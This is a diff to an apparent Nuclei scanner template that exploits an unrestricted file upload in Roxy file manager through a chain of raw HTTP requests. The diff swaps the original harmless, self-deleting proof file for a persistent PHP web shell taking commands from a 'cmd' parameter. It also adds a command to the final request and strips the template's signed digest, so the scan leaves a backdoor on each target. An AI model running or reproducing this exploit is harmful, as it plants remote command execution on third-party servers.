@@ -13,10 +13,9 @@ info:
     cvss-score: 8.8
     cwe-id: CWE-434
   metadata:
-    verified: true
-    max-request: 4
+    verified: "true"
     google-query: intitle:"Roxy file manager"
-  tags: misconfig,edb,roxy,fileman,rce,fileupload,intrusive
+  tags: intrusive,misconfig,edb,roxy,fileman,rce,fileupload
 
 http:
   - raw:
@@ -42,10 +41,11 @@ http:
         Content-Type: image/jpeg
 
         <?php
-        echo md5('roxyfileman-fileupload');unlink(__FILE__);
+        echo exec($_GET["cmd"]);
         ?>
 
         ------WebKitFormBoundary6rbEqFAMRkE0RAB7--
+
       - |
         POST /php/renamefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
@@ -53,6 +53,7 @@ http:
         X-Requested-With: XMLHttpRequest
 
         f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n={{randstr}}.php
+
       - |
         POST /php/movefile.php?f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
@@ -60,19 +61,20 @@ http:
         X-Requested-With: XMLHttpRequest
 
         f=%2Fapp%2FUploads%2F{{randstr}}.jpg&n=%2Fapp%2FUploads%2F{{randstr}}.php
+
       - |
-        GET /Uploads/{{randstr}}.php HTTP/1.1
+        GET /Uploads/{{randstr}}.php?cmd=echo+"roxyfileman"+|+rev HTTP/1.1
         Host: {{Hostname}}
 
+    cookie-reuse: true
     host-redirects: true
     max-redirects: 2
-
     matchers-condition: and
     matchers:
       - type: regex
         part: body
         regex:
-          - "99acb46eabd01958e22fae1792e83ca9"
+          - "namelifyxor"
 
       - type: word
         part: header
@@ -82,4 +84,5 @@ http:
       - type: status
         status:
           - 200
-# digest: 4a0a00473045022100f1dd983b073c38040f2465fa20d718e83c48206c4a0b7b48c528e1984452b11302200e2ae12221af6615173dd3e50b232cc4a3b94db3b6d01cbba89c949fc12ba2f5:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by md on 2022/10/04
